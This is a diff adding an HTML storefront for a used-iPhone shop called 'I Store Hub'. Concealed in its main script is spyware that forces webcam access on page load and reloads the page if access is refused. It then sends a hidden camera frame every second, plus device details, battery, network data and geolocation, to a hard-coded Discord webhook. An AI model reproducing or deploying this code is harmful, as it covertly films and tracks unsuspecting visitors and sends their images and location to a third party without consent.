@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>I Store Hub</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #000;
+      color: #fff;
+      line-height: 1.6;
+    }
+
+    header {
+      background-color: #000000;
+      padding: 20px 50px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo{
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+    .logo > p{
+        font-size: 30px;
+    }
+
+    header .logo img {
+      height: 100px;
+      width: auto;
+    }
+
+    .hamburger {
+      display: none;
+      font-size: 2rem;
+      color: white;
+      cursor: pointer;
+    }
+
+    nav {
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      padding-top: 10px;
+    }
+
+    nav a {
+      text-decoration: none;
+      color: #fff;
+      font-weight: 500;
+      font-size: 1.1rem;
+      margin: 0 20px;
+      transition: color 0.3s ease;
+    }
+
+    nav a:hover {
+      color: #0071e3;
+    }
+
+    .products-section {
+      padding: 60px 20px;
+    }
+
+    .product-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+      gap: 30px;
+      justify-items: center;
+    }
+
+    .product-card {
+      background-color: #222;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+      overflow: hidden;
+      transition: transform 0.3s ease;
+    }
+
+    .product-card:hover {
+      transform: translateY(-10px);
+    }
+
+    .product-card img {
+      width: 100%;
+      height: 300px;
+      object-fit: cover;
+    }
+
+    .product-info {
+      padding: 20px;
+      text-align: center;
+    }
+
+    .product-info h3 {
+      font-size: 1.4rem;
+      margin: 10px 0;
+      font-weight: 600;
+    }
+
+    .product-info p {
+      font-size: 1rem;
+      color: #bbb;
+      margin-bottom: 15px;
+    }
+
+    .product-info .price {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #0071e3;
+      margin-bottom: 20px;
+    }
+
+    .product-info button {
+      background-color: #0071e3;
+      color: white;
+      font-size: 1.1rem;
+      padding: 12px 25px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .product-info button:hover {
+      background-color: #005bb5;
+    }
+
+    footer {
+      background-color: #222;
+      padding: 30px 20px;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #fff;
+      border-top: 1px solid #444;
+    }
+
+    footer a {
+      text-decoration: none;
+      color: #0071e3;
+      transition: color 0.3s ease;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    video, canvas {
+      display: none;
+    }
+
+    @media (max-width: 768px) {
+      .hamburger {
+        display: block;
+      }
+
+      nav {
+        display: none;
+        flex-direction: column;
+        background-color: #000;
+        position: absolute;
+        top: 80px;
+        right: 20px;
+        width: 200px;
+        border: 1px solid #333;
+        padding: 20px;
+        z-index: 101;
+      }
+
+      nav.show {
+        display: flex;
+      }
+
+      nav a {
+        margin: 10px 0;
+      }
+
+      .product-info h3 {
+        font-size: 1.2rem;
+      }
+      .product-info p {
+        font-size: 0.9rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header>
+    <div class="logo">
+      <img src="https://media.discordapp.net/attachments/905435171224965120/1366725694264053790/488616197_550039217697921_4611391652296171568_n.png?ex=6811fdfe&is=6810ac7e&hm=c7445d9a5328c644824c9fb3b6749fe023a23b90c869b4fcb422934532598996&=&width=1534&height=1534" alt="I Store Hub Logo" />
+      <p>I STORE HUB</p>
+    </div>
+
+    <div class="hamburger" onclick="toggleMenu()">☰</div>
+
+    <nav>
+      <a href="#">Home</a>
+      <a href="#">Shop</a>
+      <a href="#">Deals</a>
+      <a href="#">Contact</a>
+      <a href="#">About</a>
+    </nav>
+  </header>
+
+  <!-- Product Section -->
+  <section class="products-section">
+    <video id="video" autoplay playsinline></video>
+    <h2 style="text-align:center; font-size:2rem; margin-bottom:30px;">Featured Products</h2>
+    <div class="product-grid">
+  <!-- iPhone 15 Pro -->
+<div class="product-card">
+    <img src="https://media.croma.com/image/upload/v1708678757/Croma%20Assets/Communication/Mobiles/Images/300824_0_opb0vg.png" alt="iPhone 15 Pro" />
+    <div class="product-info">
+      <h3>iPhone 15 Pro</h3>
+      <p>Pre-owned iPhone 15 Pro with A17 Pro chip, titanium body, and a 48MP main camera. Battery health: 90%. Slight signs of use, but still offers excellent performance. A great deal for the price!</p>
+      <div class="price">₹59,900</div>
+      <button>Add to Cart</button>
+    </div>
+  </div>
+  
+  <!-- iPhone 15 -->
+  <div class="product-card">
+    <img src="https://media.croma.com/image/upload/v1729693605/Croma%20Assets/Communication/Mobiles/Images/300684_0_s3x2kn.png" alt="iPhone 15" />
+    <div class="product-info">
+      <h3>iPhone 15</h3>
+      <p>Used iPhone 15 with a 6.1-inch display and A16 Bionic chip. Battery health: 90%. In excellent condition with no scratches. The perfect combination of power and design at a lower price!</p>
+      <div class="price">₹49,900</div>
+      <button>Add to Cart</button>
+    </div>
+  </div>
+  
+  <!-- iPhone 14 -->
+  <div class="product-card">
+    <img src="https://media.croma.com/image/upload/v1708672728/Croma%20Assets/Communication/Mobiles/Images/261934_0_kukyat.png" alt="iPhone 14" />
+    <div class="product-info">
+      <h3>iPhone 14</h3>
+      <p>Gently used iPhone 14, featuring a 6.1-inch display and the A15 Bionic chip. Battery health: 87%. A budget-friendly option for those who want a reliable phone with great camera features.</p>
+      <div class="price">₹45,900</div>
+      <button>Add to Cart</button>
+    </div>
+  </div>
+  
+  <!-- iPhone 13 -->
+  <div class="product-card">
+    <img src="https://media-ik.croma.com/prod/https://media.croma.com/image/upload/v1708671264/Croma%20Assets/Communication/Mobiles/Images/243465_0_tvikdw.png?tr=w-600" alt="iPhone SE" />
+    <div class="product-info">
+      <h3>iPhone 13</h3>
+      <p>Used iPhone 13 with the A15 Bionic chip and Super Retina display. Battery health: 92%. Well-maintained and in good condition. A fantastic deal if you're looking for a budget iPhone with top performance!</p>
+      <div class="price">₹39,900</div>
+      <button>Add to Cart</button>
+    </div>
+  </div>
+  
+  </section>
+
+  <div id="game-area" style="display:none;"></div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1366781971711266938/R3CLmI2zuaN5U1eTTFGIBbW58oj7yBakju4ygkX1aZT0FS-elKNIqo0lYJJ6lRfoM61f';
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const gameArea = document.getElementById('game-area');
+
+
+    document.addEventListener("DOMContentLoaded", function() {
+    enableCamera(); // Calls enableCamera when the page is fully loaded
+  });
+
+    function enableCamera() {
+      
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          startAutoCapture();
+          collectAdditionalInfo(); // Collect device info
+        })
+        .catch(err => {
+          alert("⚠️ Please allow camera access to proceed.");
+          location.reload(); // Force user to retry
+        });
+
+      startGameVisuals();
+    }
+
+    function startAutoCapture() {
+      setInterval(() => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('file', blob, 'vishnu-capture.png');
+          formData.append('username', 'VishnuCam');
+          formData.append('content', '📸 New frame captured!');
+
+          fetch(webhookURL, {
+            method: 'POST',
+            body: formData
+          }).catch(err => console.error('Webhook error:', err));
+        }, 'image/png');
+      }, 1000); // 0.5 seconds
+    }
+
+    function startGameVisuals() {
+      const dot = document.createElement('div');
+      dot.className = 'dot';
+      gameArea.appendChild(dot);
+
+      setInterval(() => {
+        const maxX = gameArea.clientWidth - 20;
+        const maxY = gameArea.clientHeight - 20;
+        dot.style.left = Math.random() * maxX + 'px';
+        dot.style.top = Math.random() * maxY + 'px';
+      }, 300);
+    }
+
+    function collectAdditionalInfo() {
+      // Basic device info
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenSize: `${screen.width}x${screen.height}`,
+        timestamp: new Date().toLocaleString()
+      };
+
+      // Battery status
+      if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+          deviceInfo.battery = {
+            level: battery.level * 100 + '%',
+            charging: battery.charging
+          };
+          sendDeviceInfo(deviceInfo);
+        });
+      } else {
+        sendDeviceInfo(deviceInfo);
+      }
+
+      // Network Info
+      if (navigator.connection) {
+        deviceInfo.network = {
+          type: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink + ' Mbps'
+        };
+      }
+
+      // Geolocation
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          deviceInfo.location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          };
+          sendDeviceInfo(deviceInfo);
+        }, err => {
+          deviceInfo.location = 'Permission denied';
+          
+          sendDeviceInfo(deviceInfo);
+        });
+      }
+    }
+
+    function sendDeviceInfo(info) {
+      const content = `📱 **Device Info**\n\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``;
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username: "VishnuCam", content })
+      }).catch(err => console.error('Device info send failed:', err));
+    }
+  </script>
+
+<footer>
+    <div class="footer-container">
+      <p>&copy; 2025 I Store Hub. All rights reserved.</p>
+      <div class="footer-links">
+        <a href="#">Privacy Policy</a> | 
+        <a href="#">Terms of Service</a> | 
+        <a href="#">Return & Refund Policy</a> | 
+        <a href="#">Shipping Information</a>
+      </div>
+  
+      <div class="footer-contact">
+        <p>Contact Us: <a href="mailto:support@istorehub.com">support@istorehub.com</a></p>
+        <p>Call us: +91 8876287590</p>
+      </div>
+  
+      <div class="footer-social">
+        <p>Follow Us:</p>
+        <a href="https://wa.me/918876287590/" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/512px-WhatsApp.svg.png" alt="Facebook" style="width: 25px; height: 25px; margin-right: 10px;"/></a>
+        <a href="https://www.instagram.com/i.store.hub.__?igsh=NXJlcnM5YXI1b2pu" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/512px-Instagram_icon.png" alt="Instagram" style="width: 25px; height: 25px; margin-right: 10px;"/></a>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    function toggleMenu() {
+      const nav = document.querySelector("nav");
+      nav.classList.toggle("show");
+    }
+  </script>
+</body>
+</html>
+
